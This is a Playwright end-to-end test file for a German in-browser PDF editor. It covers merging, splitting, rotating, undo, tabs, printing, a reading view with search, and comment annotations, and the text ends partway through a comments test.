import { expect, test as base, type Download, type Page } from '@playwright/test';
import { unzipSync } from 'fflate';
import { readFile, rm, writeFile } from 'node:fs/promises';
import { annotationsOf, describePdf, makeContentPdf, makePhotoPdf, outlineOf, formFieldsOf, formValues2, passwordInfo, fieldCount, formValues, imageCount, textOf, tinyPng, makeCommentedPdf, makeFormPdf, makeHalfBrokenPdf, makePdf, makeProtectedPdf, makeRichPdf } from '../fixtures';

const pdfFile = (name: string, bytes: Uint8Array) => ({ name, mimeType: 'application/pdf', buffer: Buffer.from(bytes) });

/** Joins all open documents into a new tab, in the order they were opened. */
async function mergeOpenTabs(page: Page, count: number) {
  await expect(page.getByRole('tab')).toHaveCount(count);
  await page.getByTestId('merge').click();
  await page.getByTestId('merge-submit').click();
  await expect(page.getByRole('tab')).toHaveCount(count + 1);
}

// a.pdf: pages 501, 502, 503 wide. b.pdf: 601, 602 (landscape). The width identifies each page in the output.
// The two files open in two tabs and are merged into a third, which is what most tests work on.
async function openFixtures(page: Page) {
  const a = await makePdf([501, 502, 503].map((width, i) => ({ width, label: `A${i + 1}` })));
  const b = await makePdf([
    { width: 601, label: 'B1' },
    { width: 602, height: 400, label: 'B2' },
  ]);
  await page.getByTestId('file-input').setInputFiles([pdfFile('a.pdf', a), pdfFile('b.pdf', b)]);
  await mergeOpenTabs(page, 2);
  await expect(page.locator('.card')).toHaveCount(5);
  await expect(page.locator('.card img')).toHaveCount(5); // all previews rendered
}

const cards = (page: Page) => page.locator('.card');
const card = (page: Page, n: number) => cards(page).nth(n);

async function downloadBytes(download: Download) {
  return new Uint8Array(await readFile((await download.path())!));
}

async function widthsAndRotations(bytes: Uint8Array) {
  return (await describePdf(bytes)).map((p) => `${p.width}@${p.rotation}`);
}

/**
 * Every test opens the app and, when it ends, checks the privacy guarantee:
 * the page only ever reads (GET) from its own origin, and nothing is logged as an error.
 * Anything else is blocked on the spot and fails the test, so no file content can leave the browser.
 */
const test = base.extend<{ app: Page }>({
  app: async ({ page, context, baseURL }, use) => {
    const origin = new URL(baseURL!).origin;
    const forbidden: string[] = [];
    const errors: string[] = [];
    const isAllowed = (method: string, rawUrl: string) => {
      const url = new URL(rawUrl);
      if (url.protocol === 'data:') return true;
      // blob: URLs carry the origin that created them.
      return url.origin === origin && method === 'GET';
    };
    await context.route('**/*', (route) => {
      const request = route.request();
      if (isAllowed(request.method(), request.url())) return route.continue();
      forbidden.push(`${request.method()} ${request.url()}`);
      return route.abort();
    });
    // Second net for requests that never reach the router.
    context.on('request', (request) => {
      const entry = `${request.method()} ${request.url()}`;
      if (!isAllowed(request.method(), request.url()) && !forbidden.includes(entry)) forbidden.push(entry);
    });
    page.on('pageerror', (e) => errors.push(e.message));
    page.on('console', (m) => {
      if (m.type() === 'error') errors.push(m.text());
    });
    await page.goto('/');
    await use(page);
    expect(forbidden, 'requests other than GET to the own origin').toEqual([]);
    expect(errors, 'console errors').toEqual([]);
  },
});

test('shows the empty state with the privacy promise', async ({ app: page }) => {
  await expect(page.getByRole('heading', { name: 'PDFgoat' })).toBeVisible();
  await expect(page.getByText('Nichts wird hochgeladen')).toBeVisible();
  await expect(page.getByRole('heading', { name: 'PDFs bearbeiten, ohne Upload.' })).toBeVisible();
  await expect(page.getByRole('button', { name: 'PDF auswählen' })).toBeVisible();
  await expect(page.getByRole('toolbar')).toHaveCount(0); // the tools appear once a file is open
  await expect(page.locator('html')).toHaveAttribute('lang', 'de');
});

test('merges two files after rotating, deleting and reordering', async ({ app: page }) => {
  await openFixtures(page);
  await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();

  await card(page, 0).getByLabel('Im Uhrzeigersinn drehen').click(); // A1 → 90°
  await card(page, 1).getByLabel('Seite löschen').click(); // A2 gone: A1 A3 B1 B2
  await card(page, 3).dragTo(card(page, 1), { targetPosition: { x: 5, y: 50 } }); // B2 before A3
  await expect(cards(page)).toHaveCount(4);

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt.pdf');
  expect(await widthsAndRotations(await downloadBytes(file))).toEqual(['501@90', '602@0', '503@0', '601@0']);
});

test('undo restores the previous order', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 0).getByLabel('Nach rechts verschieben').click();
  await page.getByRole('button', { name: 'Reihenfolge umkehren' }).click();
  await page.keyboard.press('Control+z');
  await page.getByRole('button', { name: 'Rückgängig' }).click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '501@0', '502@0', '503@0', '601@0', '602@0',
  ]);
});

test('redo brings back what undo removed, by button and by keyboard', async ({ app: page }) => {
  await openFixtures(page);
  const redo = page.getByRole('button', { name: 'Wiederholen' });
  await expect(redo).toBeDisabled();

  await card(page, 0).getByLabel('Seite löschen').click(); // A1 gone
  await page.getByRole('button', { name: 'Reihenfolge umkehren' }).click();
  await page.keyboard.press('Control+z');
  await page.keyboard.press('Control+z');
  await expect(cards(page)).toHaveCount(5);
  await redo.click(); // A1 gone again
  await page.keyboard.press('Control+y'); // reversed again
  await expect(redo).toBeDisabled();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '602@0', '601@0', '503@0', '502@0',
  ]);
});

test('rotates and deletes a shift-click selection', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 1).locator('.card-thumb').click();
  await card(page, 3).locator('.card-thumb').click({ modifiers: ['Shift'] });
  await expect(page.getByText('3 ausgewählt')).toBeVisible();
  await page.getByRole('button', { name: 'Links drehen' }).click();
  await page.keyboard.press('Escape'); // clear the selection
  await card(page, 4).locator('.card-thumb').click();
  await page.keyboard.press('Delete');
  await expect(cards(page)).toHaveCount(4);

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '501@0', '502@270', '503@270', '601@270',
  ]);
});

test('no longer counts a file once all of its pages are deleted', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 4).getByLabel('Seite löschen').click();
  await card(page, 3).getByLabel('Seite löschen').click();
  await expect(page.locator('.status')).toContainText('3 Seiten');
  await expect(page.locator('.status')).not.toContainText('Dateien');

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect((await download).suggestedFilename()).toBe('a.pdf');
});

// Sync folders, scanners and cleaned-up download folders change files behind the browser's back.
test('still saves the opened pages after the file on disk was overwritten and deleted', async ({ app: page }, testInfo) => {
  const path = testInfo.outputPath('vertrag.pdf');
  await writeFile(path, await makePdf([{ width: 501 }, { width: 502 }]));
  await page.getByTestId('file-input').setInputFiles(path);
  await expect(cards(page)).toHaveCount(2);

  await writeFile(path, await makePdf([{ width: 999 }]));
  await rm(path);
  await card(page, 0).getByLabel('Im Uhrzeigersinn drehen').click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(['501@90', '502@0']);
});

test('splits by page ranges into a ZIP', async ({ app: page }) => {
  await openFixtures(page);
  await page.getByRole('button', { name: 'Aufteilen', exact: false }).first().click();
  await page.getByRole('textbox', { name: 'Seitenbereiche' }).fill('1-2, 3, 4-');

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt-aufgeteilt.zip');

  const parts = unzipSync(await downloadBytes(file));
  expect(Object.keys(parts)).toEqual([
    'zusammengefuegt-01_S1-2.pdf',
    'zusammengefuegt-02_S3.pdf',
    'zusammengefuegt-03_S4-5.pdf',
  ]);
  expect(await widthsAndRotations(parts['zusammengefuegt-03_S4-5.pdf'])).toEqual(['601@0', '602@0']);
});

test('shows an error for an invalid range and keeps the dialog open', async ({ app: page }) => {
  await openFixtures(page);
  await page.getByRole('button', { name: /Aufteilen/ }).first().click();
  await page.getByRole('textbox', { name: 'Seitenbereiche' }).fill('2-9');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  await expect(page.getByRole('alert')).toContainText('außerhalb von 1–5');
  await expect(page.getByRole('dialog')).toBeVisible();
});

test('saves the selection as one PDF', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 4).locator('.card-thumb').click();
  await card(page, 0).locator('.card-thumb').click();
  await page.getByRole('button', { name: /Aufteilen/ }).first().click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt-auswahl.pdf');
  expect(await widthsAndRotations(await downloadBytes(file))).toEqual(['501@0', '602@0']);
});

test('opens the large preview and steps through pages', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 1).locator('.card-thumb').dblclick();
  const dialog = page.getByRole('dialog');
  await expect(dialog).toContainText('Seite 2 von 5');
  await expect(dialog.locator('img')).toBeVisible();
  await page.keyboard.press('ArrowRight');
  await expect(dialog).toContainText('Seite 3 von 5');
  await page.keyboard.press('Escape');
  await expect(dialog).toBeHidden();
});

test('renders previews only for pages near the visible area', async ({ app: page }) => {
  const many = await makePdf(Array.from({ length: 80 }, () => ({ width: 300, height: 400 })));
  await page.getByTestId('file-input').setInputFiles(pdfFile('viele.pdf', many));
  await expect(cards(page)).toHaveCount(80);
  await expect(card(page, 0).locator('img')).toBeVisible();

  const last = card(page, 79);
  await expect(last.locator('img')).toHaveCount(0);
  expect(await page.locator('.card img').count()).toBeLessThan(80);

  await last.scrollIntoViewIfNeeded();
  await expect(last.locator('img')).toBeVisible();
});

test.describe('tabs', () => {
  async function openTwo(page: Page) {
    const a = await makePdf([501, 502, 503].map((width) => ({ width })));
    const b = await makePdf([601, 602].map((width) => ({ width })));
    await page.getByTestId('file-input').setInputFiles([pdfFile('a.pdf', a), pdfFile('b.pdf', b)]);
    await expect(page.getByRole('tab')).toHaveCount(2);
  }
  const tab = (page: Page, name: string) => page.getByRole('tab', { name, exact: true });

  test('opens every file in its own tab with its own pages and history', async ({ app: page }) => {
    await openTwo(page);
    await expect(tab(page, 'b.pdf')).toHaveAttribute('aria-selected', 'true');
    await expect(cards(page)).toHaveCount(2);

    await tab(page, 'a.pdf').click();
    await expect(cards(page)).toHaveCount(3);
    await card(page, 0).hover();
    await card(page, 0).getByRole('button', { name: /löschen/i }).click();
    await expect(cards(page)).toHaveCount(2);

    await tab(page, 'b.pdf').click();
    await expect(cards(page)).toHaveCount(2);
    await expect(page.getByRole('button', { name: /Rückgängig/ })).toBeDisabled();
    await tab(page, 'a.pdf').click();
    await page.getByRole('button', { name: /Rückgängig/ }).click();
    await expect(cards(page)).toHaveCount(3);
  });

  test('never undoes the opening of a file', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(cards(page)).toHaveCount(1);
    await expect(page.getByRole('button', { name: /Rückgängig/ })).toBeDisabled();
    await page.keyboard.press('Control+z');
    await expect(cards(page)).toHaveCount(1);
  });

  test('asks before closing a tab with changes, but not one without', async ({ app: page }) => {
    await openTwo(page);
    page.once('dialog', (d) => {
      throw new Error(`unexpected dialog: ${d.message()}`);
    });
    await page.getByRole('button', { name: 'b.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(1);
    page.removeAllListeners('dialog');

    await card(page, 0).hover();
    await card(page, 0).getByRole('button', { name: /löschen/i }).click();
    page.once('dialog', (d) => d.dismiss());
    await page.getByRole('button', { name: 'a.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(1);
    page.once('dialog', (d) => d.accept());
    await page.getByRole('button', { name: 'a.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(0);
    await expect(page.getByRole('button', { name: 'PDF auswählen' })).toBeVisible();
  });

  test('merges chosen documents in the chosen order into a new tab, leaving the others as they are', async ({ app: page }) => {
    await openTwo(page);
    await page.getByTestId('merge').click();
    await page.getByRole('button', { name: 'b.pdf nach oben' }).click();
    await page.getByTestId('merge-submit').click();
    await expect(tab(page, 'Zusammengefügt')).toHaveAttribute('aria-selected', 'true');
    await expect(cards(page)).toHaveCount(5);

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: /Zusammengefügt speichern/ }).click();
    expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(
      ['601@0', '602@0', '501@0', '502@0', '503@0'],
    );
    await tab(page, 'a.pdf').click();
    await expect(cards(page)).toHaveCount(3);
  });

  test('keeps the files of a merged document after the original tabs are closed', async ({ app: page }) => {
    await openTwo(page);
    await page.getByTestId('merge').click();
    await page.getByTestId('merge-submit').click();
    await page.getByRole('button', { name: 'a.pdf schließen' }).click();
    await page.getByRole('button', { name: 'b.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(1);
    await expect(card(page, 0).locator('img')).toBeVisible();

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: /Zusammengefügt speichern/ }).click();
    expect((await describePdf(await downloadBytes(await download))).map((p) => p.width)).toEqual([501, 502, 503, 601, 602]);
  });

  test('comes back to the place in the reading view when switching tabs', async ({ app: page }) => {
    await openTwo(page);
    await tab(page, 'a.pdf').click();
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await page.locator('.reader-scroll').focus();
    await page.keyboard.press('End');
    await expect(page.getByRole('textbox', { name: /Seite/ })).toHaveValue('3');

    await tab(page, 'b.pdf').click();
    await expect(page.locator('.reader')).toHaveCount(0);
    await tab(page, 'a.pdf').click();
    await expect(page.locator('.reader')).toBeVisible();
    await expect(page.getByRole('textbox', { name: /Seite/ })).toHaveValue('3');
  });
});

test.describe('command palette', () => {
  const palette = (page: Page) => page.getByRole('dialog', { name: 'Befehle' });
  const box = (page: Page) => palette(page).getByRole('combobox');

  test('opens with Ctrl+K, filters while typing and runs the chosen command with Enter', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }, { width: 400 }])));
    await expect(cards(page)).toHaveCount(2);
    await page.keyboard.press('Control+k');
    await expect(palette(page)).toBeVisible();
    await box(page).fill('lesen');
    await expect(palette(page).getByRole('option')).toHaveCount(1);
    await box(page).press('Enter');
    await expect(palette(page)).toHaveCount(0);
    await expect(page.locator('.reader')).toBeVisible();
  });

  test('only offers commands that can run now', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }, { width: 400 }])));
    await expect(cards(page)).toHaveCount(2);
    await page.keyboard.press('Control+k');
    await box(page).fill('drehen');
    await expect(palette(page)).toContainText('Kein passender Befehl');
    await page.keyboard.press('Escape');

    await card(page, 0).getByRole('button', { name: /Seite 1 auswählen/ }).click();
    await page.keyboard.press('Control+k');
    await box(page).fill('rechts dreh');
    await box(page).press('Enter');
    await expect(card(page, 0).locator('img')).toHaveCSS('transform', /matrix\(0, 1, -1, 0/);
  });

  test('moves through the list with the arrow keys and closes with Escape', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(cards(page)).toHaveCount(1);
    await page.keyboard.press('Control+k');
    const options = palette(page).getByRole('option');
    await expect(options.first()).toHaveAttribute('aria-selected', 'true');
    await box(page).press('ArrowDown');
    await expect(options.nth(1)).toHaveAttribute('aria-selected', 'true');
    await box(page).press('Escape');
    await expect(palette(page)).toHaveCount(0);
  });

  test('is available on the start page too', async ({ app: page }) => {
    await page.keyboard.press('Control+k');
    await box(page).fill('öffnen');
    await expect(palette(page).getByRole('option')).toHaveCount(1);
  });

  test('finds commands in English as well', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(cards(page)).toHaveCount(1);
    await page.keyboard.press('Control+k');
    await page.getByRole('dialog', { name: 'Commands' }).getByRole('combobox').fill('print');
    await expect(page.getByRole('option', { name: /Print/ })).toBeVisible();
  });
});

test.describe('printing', () => {
  // The print dialog cannot be driven in a test, so print() only records what is on the page.
  test.beforeEach(async ({ app: page }) => {
    await page.evaluate(() => {
      const w = window as unknown as { printed: { images: number; classes: string[] }[] };
      w.printed = [];
      window.print = () => {
        const images = [...document.querySelectorAll<HTMLImageElement>('.print-sheet img')];
        w.printed.push({ images: images.length, classes: images.map((i) => i.className) });
      };
    });
  });
  const printed = (page: Page) => page.evaluate(() => (window as unknown as { printed: unknown[] }).printed);

  test('draws the edited page list and prints it, then frees the images', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 1).hover();
    await card(page, 1).getByRole('button', { name: /löschen/i }).click();
    await page.getByRole('button', { name: /Drucken/ }).click();
    await expect.poll(() => printed(page)).toHaveLength(1);
    expect(await printed(page)).toEqual([{ images: 4, classes: [...Array(3).fill('print-page portrait'), 'print-page landscape'] }]);
    await expect(page.locator('.print-sheet img')).toHaveCount(4);

    await page.evaluate(() => window.dispatchEvent(new Event('afterprint')));
    await expect(page.locator('.print-sheet')).toHaveCount(0);
  });

  test('prints wide pages in landscape', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('quer.pdf', await makePdf([{ width: 800, height: 400 }, { width: 400 }])));
    await expect(cards(page)).toHaveCount(2);
    await page.keyboard.press('Control+p');
    await expect.poll(() => printed(page)).toHaveLength(1);
    expect(await printed(page)).toEqual([{ images: 2, classes: ['print-page landscape', 'print-page portrait'] }]);
  });

  test('hides the editor when printing', async ({ app: page }) => {
    await openFixtures(page);
    await page.getByRole('button', { name: /Drucken/ }).click();
    await expect.poll(() => printed(page)).toHaveLength(1);
    await page.emulateMedia({ media: 'print' });
    await expect(page.locator('.shell')).toBeHidden();
    await expect(page.locator('.print-sheet')).toBeVisible();
  });
});

test.describe('reading view', () => {
  const read = (page: Page) => page.getByRole('button', { name: 'Lesen', exact: true }).click();
  const pageField = (page: Page) => page.getByRole('textbox', { name: /Seite/ });
  const scroller = (page: Page) => page.locator('.reader-scroll');

  test('shows all pages in a continuous view and draws the ones in sight', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    await expect(page.locator('.read-page')).toHaveCount(5);
    await expect(page.locator('.read-page img').first()).toBeVisible();
    await expect(pageField(page)).toHaveValue('1');
    await expect(page.getByText('von 5')).toBeVisible();
  });

  test('follows edits made in the page view', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 0).hover();
    await card(page, 0).getByRole('button', { name: /löschen/i }).click();
    await read(page);
    await expect(page.locator('.read-page')).toHaveCount(4);
  });

  test('zooms with the buttons and the list', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    const before = await page.locator('.read-page').first().boundingBox();
    await page.getByRole('button', { name: 'Vergrößern' }).click();
    await expect(page.locator('.zoom-now')).toHaveText(/^\d+ %$/);
    const after = await page.locator('.read-page').first().boundingBox();
    expect(after!.width).toBeGreaterThan(before!.width);

    await page.getByRole('combobox', { name: 'Zoom' }).selectOption('50');
    await expect(page.locator('.zoom-now')).toHaveText('50 %');
    const small = await page.locator('.read-page').first().boundingBox();
    expect(Math.round(small!.width)).toBe(Math.round(501 * (96 / 72) * 0.5));
  });

  test('pages with the keyboard and jumps to a typed page number', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    await scroller(page).focus();
    await page.keyboard.press('End');
    await expect(pageField(page)).toHaveValue('5');
    await page.keyboard.press('Home');
    await expect(pageField(page)).toHaveValue('1');
    await page.keyboard.press('PageDown');
    await expect(pageField(page)).toHaveValue('2');

    await pageField(page).fill('4');
    await pageField(page).press('Enter');
    await expect(pageField(page)).toHaveValue('4');
    await expect(page.locator('.read-page[data-page="4"] img')).toBeVisible();
  });

  test('puts selectable text over the page', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    const line = page.locator('.read-page[data-page="1"] .text-layer span');
    await expect(line).toHaveText('A1');
    await line.click({ clickCount: 3 });
    expect(await page.evaluate(() => window.getSelection()?.toString().trim())).toBe('A1');
  });

  test('finds text, counts the matches and jumps to them', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    const search = page.getByRole('searchbox', { name: 'Im Dokument suchen' });
    await search.fill('a');
    await expect(page.locator('.search-state')).toHaveText('1 von 3');
    await search.press('Enter');
    await expect(page.locator('.search-state')).toHaveText('2 von 3');
    await expect(pageField(page)).toHaveValue('2');
    await expect(page.locator('.hit.active')).toBeVisible();
    await search.press('Shift+Enter');
    await search.press('Shift+Enter');
    await expect(page.locator('.search-state')).toHaveText('3 von 3');
    await expect(pageField(page)).toHaveValue('3');

    await search.fill('a3');
    await expect(page.locator('.search-state')).toHaveText('1 von 1');
    await expect(pageField(page)).toHaveValue('3');
    await search.fill('gibtsnicht');
    await expect(page.locator('.search-state')).toHaveText('Nichts gefunden');
    await expect(page.locator('.hit')).toHaveCount(0);
  });

  test('Ctrl+F searches the document instead of the browser', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    await scroller(page).focus();
    await page.keyboard.press('Control+f');
    await expect(page.getByRole('searchbox', { name: 'Im Dokument suchen' })).toBeFocused();
  });

  test('keeps highlights in place on a rotated page', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 0).getByRole('button', { name: /Seite 1 auswählen/ }).click();
    await page.getByRole('button', { name: /Rechts drehen/ }).click();
    await read(page);
    await page.getByRole('searchbox', { name: 'Im Dokument suchen' }).fill('A1');
    const hit = page.locator('.read-page[data-page="1"] .hit.active');
    await expect(hit).toBeVisible();
    const pageBox = (await page.locator('.read-page[data-page="1"]').boundingBox())!;
    const hitBox = (await hit.boundingBox())!;
    expect(hitBox.x).toBeGreaterThanOrEqual(pageBox.x - 1);
    expect(hitBox.x + hitBox.width).toBeLessThanOrEqual(pageBox.x + pageBox.width + 1);
    expect(hitBox.y).toBeGreaterThanOrEqual(pageBox.y - 1);
    expect(hitBox.y + hitBox.height).toBeLessThanOrEqual(pageBox.y + pageBox.height + 1);
  });

  const openRich = async (page: Page, ...tags: string[]) => {
    await page.getByTestId('file-input').setInputFiles(
      await Promise.all(tags.map(async (tag) => pdfFile(`${tag}.pdf`, await makeRichPdf(tag, 500)))),
    );
    if (tags.length > 1) await mergeOpenTabs(page, tags.length);
    await expect(cards(page)).toHaveCount(3 * tags.length);
    await read(page);
  };
  const sidebar = (page: Page) => page.getByRole('complementary', { name: 'Seitenleiste' });

  test('jumps to a page from its thumbnail in the sidebar', async ({ app: page }) => {
    await openRich(page, 'A');
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await expect(sidebar(page).locator('.thumb')).toHaveCount(3);
    await expect(sidebar(page).locator('.thumb img').first()).toBeVisible();
    await sidebar(page).getByRole('button', { name: 'Zu Seite 3' }).click();
    await expect(pageField(page)).toHaveValue('3');
    await expect(sidebar(page).getByRole('button', { name: 'Zu Seite 3' })).toHaveAttribute('aria-current', 'page');
  });

  test('lists bookmarks and jumps to their pages', async ({ app: page }) => {
    await openRich(page, 'A');
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await sidebar(page).getByRole('tab', { name: 'Lesezeichen' }).click();
    await sidebar(page).getByRole('button', { name: 'A Drei', exact: true }).click();
    await expect(pageField(page)).toHaveValue('3');
    await sidebar(page).getByRole('button', { name: 'A Zwei innen' }).click();
    await expect(pageField(page)).toHaveValue('2');
  });

  test('greys out a bookmark whose page was deleted', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('A.pdf', await makeRichPdf('A', 500)));
    await expect(cards(page)).toHaveCount(3);
    await card(page, 2).hover();
    await card(page, 2).getByRole('button', { name: /löschen/i }).click();
    await read(page);
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await sidebar(page).getByRole('tab', { name: 'Lesezeichen' }).click();
    await expect(sidebar(page).getByRole('button', { name: 'A Drei', exact: true })).toBeDisabled();
    await expect(sidebar(page).getByRole('button', { name: 'A Eins' })).toBeEnabled();
  });

  test('gives every file its own heading in the bookmarks', async ({ app: page }) => {
    await openRich(page, 'A', 'B');
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await sidebar(page).getByRole('tab', { name: 'Lesezeichen' }).click();
    await expect(sidebar(page).getByRole('button', { name: 'A.pdf', exact: true })).toBeVisible();
    await sidebar(page).getByRole('button', { name: 'B.pdf', exact: true }).click();
    await expect(pageField(page)).toHaveValue('4');
    await sidebar(page).getByRole('button', { name: 'B Drei', exact: true }).click();
    await expect(pageField(page)).toHaveValue('6');
  });

  test('follows links inside the file and opens web links in a new tab', async ({ app: page }) => {
    await openRich(page, 'A');
    const links = page.locator('.read-page[data-page="1"] a.page-link');
    await expect(links).toHaveCount(2);
    const web = page.locator('a.page-link[href="https://example.org/"]');
    await expect(web).toHaveAttribute('target', '_blank');
    await expect(web).toHaveAttribute('rel', /noopener/);
    await page.locator('a.page-link[title="Zu Seite 3"]').click();
    await expect(pageField(page)).toHaveValue('3');
  });

  test('shows a rotated page turned', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 0).getByRole('button', { name: /Seite 1 auswählen/ }).click();
    await page.getByRole('button', { name: /Rechts drehen/ }).click();
    await read(page);
    await page.getByRole('combobox', { name: 'Zoom' }).selectOption('100');
    const box = await page.locator('.read-page').first().boundingBox();
    expect(box!.width).toBeGreaterThan(box!.height);
  });
});

test('shows a PDF with an embedded font and starts the PDF engine only when a file is opened', async ({ app: page }) => {
  const scripts = () => page.evaluate(() => performance.getEntriesByType('resource').map((r) => r.name));
  expect((await scripts()).some((name) => name.includes('view.worker'))).toBe(false);

  const bytes = await readFile(new URL('../files/embedded-font.pdf', import.meta.url));
  await page.getByTestId('file-input').setInputFiles(pdfFile('schrift.pdf', bytes));
  await expect(card(page, 0).locator('img')).toBeVisible();
  expect((await scripts()).some((name) => name.includes('view.worker'))).toBe(true);
});

test('a damaged page shows a placeholder, and the good pages can still be saved', async ({ page }) => {
  // Not the `app` fixture: the browser reports the damaged page in its console, which is expected here.
  await page.goto('/');
  await page.getByTestId('file-input').setInputFiles(pdfFile('halb.pdf', await makeHalfBrokenPdf()));
  await expect(cards(page)).toHaveCount(2);
  await expect(card(page, 0).locator('img')).toBeVisible();
  await expect(card(page, 1)).toContainText('Keine Vorschau');

  await page.getByRole('button', { name: 'PDF speichern' }).click();
  await expect(page.getByRole('alert')).toContainText('Seite 2 von „halb.pdf“ ist beschädigt');

  await card(page, 1).getByLabel('Seite löschen').click();
  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(['501@0']);
});

test.describe('comments', () => {
  const tool = (page: Page, name: string) => page.getByRole('button', { name, exact: true });
  const panelButton = (page: Page) => page.getByRole('button', { name: /^Kommentare \(/ });
  const sheet = (page: Page) => page.locator('.read-page').first();

  async function openOne(page: Page, bytes: Uint8Array) {
    await page.getByTestId('file-input').setInputFiles(pdfFile('doc.pdf', bytes));
    await expect(page.locator('.card img')).toHaveCount(1);
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await expect(page.locator('.read-page img')).toBeVisible();
  }

  async function save(page: Page) {
    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    return annotationsOf(await downloadBytes(await download));
  }

  async function drag(page: Page, from: [number, number], to: [number, number]) {
    const box = (await sheet(page).boundingBox())!;
    await page.mouse.move(box.x + from[0], box.y + from[1]);
    await page.mouse.down();
    await page.mouse.move(box.x + (from[0] + to[0]) / 2, box.y + (from[1] + to[1]) / 2, { steps: 4 });
    await page.mouse.move(box.x + to[0], box.y + to[1], { steps: 4 });
    await page.mouse.up();
  }

  test('adds a note, takes its text from the list and saves it as a real PDF comment', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await expect(panelButton(page)).toHaveText('Kommentare (0)');
    await tool(page, 'Notiz').click();
    await sheet(page).click({ position: { x: 200, y: 120 } });
    await expect(panelButton(page)).toHaveText('Kommentare (1)');
    await panelButton(page).click();
    const field = page.getByRole('textbox', { name: 'Kommentartext' });
    await field.fill('Bitte prüfen: Größe & Maß');
    await field.blur();
    await expect(page.locator('.comment-text')).toHaveCount(0); // still being edited
    expect(await save(page)).toEqual([[{ type: 'Text', contents: 'Bitte prüfen: Größe & Maß' }]]);
  });

  test('draws a rectangle, a line and a freehand stroke', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Rechteck').click();
    await drag(page, [100, 120], [300, 200]);
    await tool(page, 'Pfeil').click();
    await drag(page, [100, 210], [300, 250]);
    await tool(page, 'Zeichnen').click();
    await drag(page, [100, 260], [250, 300]);
    await expect(panelButton(page)).toHaveText('Kommentare (3)');
    expect((await save(page))[0].map((a) => a.type)).toEqual(['Square', 'Line', 'Ink']);
  });

  test('highlights selected text and saves the highlight', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Markieren').click();
    await page.locator('.read-page .text-layer span').first().dblclick();
    await expect(panelButton(page)).toHaveText('Kommentare (1)');
    await expect(page.locator('.annot-markup rect:not(.annot-ring)')).toHaveCount(1);
    expect((await save(page))[0].map((a) => a.type)).toEqual(['Highlight']);
  });

  test('places a text box and a stamp', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Textfeld').click();
    await drag(page, [100, 150], [320, 200]);
    await panelButton(page).click();
